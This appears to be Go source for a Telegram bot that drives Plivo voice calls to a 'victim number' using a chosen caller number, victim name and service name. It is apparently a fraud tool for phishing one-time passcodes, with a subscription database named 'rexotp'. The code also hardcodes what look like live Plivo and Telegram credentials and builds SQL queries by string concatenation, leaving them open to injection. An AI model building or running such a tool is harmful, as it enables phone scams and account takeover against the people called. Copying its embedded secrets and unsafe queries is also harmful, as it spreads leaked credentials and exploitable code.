package main

import (
	"database/sql"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/plivo/plivo-go"
	tb "gopkg.in/tucnak/telebot.v2"
)

type Plan struct {
	DPS        int
	tokens     int
	admin      int
	BlockUser  int
	TelegramID int64
	expiry     int64
}
type teleinfo struct {
	UserID string
}

type originalmsg struct {
	msgid int
}

var NGROK_URL string = ""

// replace with your url

func main() {

	client, _ := plivo.NewClient("MAYMQZOTG3ZWY5NTIYZT", "ODJmMDNjZGM5NGQ4YTM2ODEyZWMwMzk5YTdiZDQz", &plivo.ClientOptions{})

	//connecting to dB

	b, err := tb.NewBot(tb.Settings{
		// You can also set custom API URL.
		// If field is empty it equals to "https://api.telegram.org".
		URL: "https://api.telegram.org",

		Token:  "2059290656:AAHf5gEb60I5H1iXqEJoMDUVRCkXa4MSS3s",
		Poller: &tb.LongPoller{Timeout: 10 * time.Second},
	})
	if err != nil {
		log.Fatal(err)
		return
	}
	// Command: /start <PAYLOAD>

	b.Handle("/startcall", func(m *tb.Message) {

		data := strings.Split(m.Text, " ")
		/*
			data[1] - victim number
			data[2] - from number
			data[3] - victim name
			data[4] - service name
		*/
		fmt.Println(data)
		mes, _ := b.Send(m.Sender, "Call started...")

		_, err := client.Calls.Create(
			plivo.CallCreateParams{
				From:                data[2], //from number
				To:                  data[1], //to number
				AnswerURL:           fmt.Sprintf("%v/generate_xml/%v/%v/%v/%v", NGROK_URL, m.Chat.ID, data[3], data[4], mes.ID),
				AnswerMethod:        "GET",
				TimeLimit:           60,
				MachineDetection:    "true",
				MachineDetectionUrl: fmt.Sprintf("%v/machine/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
				HangupURL:           fmt.Sprintf("%v/hangup/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
				RingURL:             fmt.Sprintf("%v/ring/%v/%v", NGROK_URL, m.Chat.ID, mes.ID)}, //name
		)
		if err != nil {
			panic(err)
		}
	})

	fmt.Println(time.Now().Unix())
	b.Start() // starting the bot

}

func GetProfile(TelegramID string) (*Plan, error) {
	db, err := sql.Open("mysql", "root:@/rexotp")
	if err != nil {
		fmt.Println(err.Error())
	}
	row := db.QueryRow("SELECT DPS, TelagramID, Administrator, BlockedUser, SessionTokens, expiry FROM `users` WHERE TelagramID =" + TelegramID)
	if row.Err() != nil {
		return nil, row.Err()
	}
	var userCache Plan

	err = row.Scan(&userCache.DPS, &userCache.TelegramID, &userCache.admin, &userCache.BlockUser, &userCache.tokens, &userCache.expiry)
	if err != nil {
		return nil, err
	}

	return &userCache, nil

}

func registercheck(userid int) bool {
	db, err := sql.Open("mysql", "root:@/rexotp")
	if err != nil {
		fmt.Println(err.Error())
	}
	defer db.Close()
	row, err := db.Query("SELECT TelagramID FROM users WHERE TelagramID=" + strconv.Itoa(userid))
	if err != nil {
		return false
	}
	if !row.Next() {
		return false
	}

	return true
}

func adduser(userid int) {
	db, err := sql.Open("mysql", "root:@/rexotp")
	if err != nil {
		fmt.Println(err.Error())
	}
	defer db.Close()
	query := "INSERT INTO `users`(`DPS`, `TelagramID`, `Administrator`, `BlockedUser`, `SessionTokens`, `expiry`) VALUES (NULL," + strconv.Itoa(userid) + ",'0','0','0','0')"
	_, err = db.Exec(query)
	if err != nil {
		fmt.Println(err)
	}

}
